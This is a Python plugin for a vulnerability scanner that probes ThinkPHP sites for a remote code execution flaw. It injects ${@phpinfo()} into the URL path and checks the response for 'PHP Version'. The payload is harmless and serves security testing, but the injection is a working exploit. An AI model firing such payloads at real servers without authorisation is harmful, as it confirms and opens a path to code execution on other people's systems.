
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):

    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'thinkphp url exec'
        self.keyword = ['thinkphp']
        self.info = 'thinkphp url exec'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.refer = ''
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            pocs = ["index.php/module/aciton/param1/${@phpinfo()}"]
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, ['./public/', './']):
                    for poc in pocs:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res != None:
                                text = await res.text()
                                if 'PHP Version' in text:
                                    self.flag = 1
                                    self.req.append({"flag": url})
                                    self.res.append({"info": url, "key": "thinkphp url exec"})
                                    break
